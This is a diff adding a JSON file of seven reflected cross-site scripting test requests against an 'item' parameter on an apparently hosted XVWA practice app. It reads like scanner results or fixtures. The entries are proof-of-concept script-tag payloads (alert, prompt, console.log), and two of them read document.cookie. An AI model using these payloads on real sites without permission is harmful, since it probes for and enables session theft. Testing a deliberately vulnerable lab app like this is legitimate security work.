@@ -1,0 +1,37 @@
+[
+    {
+        "url_xss": "https://donky.party/xvwa/vulnerabilities/reflected_xss/?item=%3Cscript%3Eprompt%285000%2F200%29%3C%2Fscript%3E",
+        "method": "GET",
+        "data": "{'item': '<script>prompt(5000/200)</script>'}"
+    },
+    {
+        "url_xss": "https://donky.party/xvwa/vulnerabilities/reflected_xss/?item=%3Cscript%3Ealert%286000%2F3000%29%3C%2Fscript%3E",
+        "method": "GET",
+        "data": "{'item': '<script>alert(6000/3000)</script>'}"
+    },
+    {
+        "url_xss": "https://donky.party/xvwa/vulnerabilities/reflected_xss/?item=%3Cscript%3Ealert%28document.cookie%29%3C%2Fscript%3E",
+        "method": "GET",
+        "data": "{'item': '<script>alert(document.cookie)</script>'}"
+    },
+    {
+        "url_xss": "https://donky.party/xvwa/vulnerabilities/reflected_xss/?item=%3Cscript%3Eprompt%28document.cookie%29%3C%2Fscript%3E",
+        "method": "GET",
+        "data": "{'item': '<script>prompt(document.cookie)</script>'}"
+    },
+    {
+        "url_xss": "https://donky.party/xvwa/vulnerabilities/reflected_xss/?item=%3Cscript%3Econsole.log%285000%2F3000%29%3C%2Fscript%3E",
+        "method": "GET",
+        "data": "{'item': '<script>console.log(5000/3000)</script>'}"
+    },
+    {
+        "url_xss": "https://donky.party/xvwa/vulnerabilities/reflected_xss/?item=%3Cscript%3Ealert%281%29%250d%250a--%3E%2509%3C%2Fscript%3E",
+        "method": "GET",
+        "data": "{'item': '<script>alert(1)%0d%0a-->%09</script>'}"
+    },
+    {
+        "url_xss": "https://donky.party/xvwa/vulnerabilities/reflected_xss/?item=%3Cscript%3Ealert%28xss%29%3C%2Fscript%3E",
+        "method": "GET",
+        "data": "{'item': '<script>alert(xss)</script>'}"
+    }
+]
